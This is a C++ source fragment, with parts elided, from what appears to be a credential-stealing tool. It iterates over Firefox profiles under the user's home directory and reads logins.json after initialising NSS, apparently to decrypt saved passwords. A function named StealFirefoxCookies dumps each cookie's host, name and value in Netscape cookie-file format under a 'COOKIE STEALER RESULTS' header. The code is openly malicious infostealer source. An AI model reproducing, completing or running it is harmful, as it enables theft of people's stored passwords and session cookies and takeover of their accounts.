...
namespace credential {
        ...
        for (const auto& entry : fs::directory_iterator(mozillaPath)) {
            if (entry.is_directory()) {
                ...
                if (fs::exists(loginsPath)) {
                    bool nssInited = false; if (nssLoaded && nss.init(profilePath.c_str()) == SECSuccess) nssInited = true;
                    std::ifstream f(loginsPath); nlohmann::json j;
                    try {
                        f >> j;
    ...
    std::string StealFirefoxCookies() {
        std::stringstream ss; ss << "# FIREFOX COOKIE STEALER RESULTS\n";
        const char* home = getenv("HOME"); if (!home) return ss.str();
        std::string mozillaPath = std::string(home) + "/.mozilla/firefox";
                    ...
                    if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                        ...
                        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                ...
                                if (host && name && value) ss << host << "\tTRUE\t" << (path ? path : "") << "\t" << (isSecure ? "TRUE" : "FALSE") << "\t" << expiry << "\t" << name << "\t" << value << "\n";
                            }
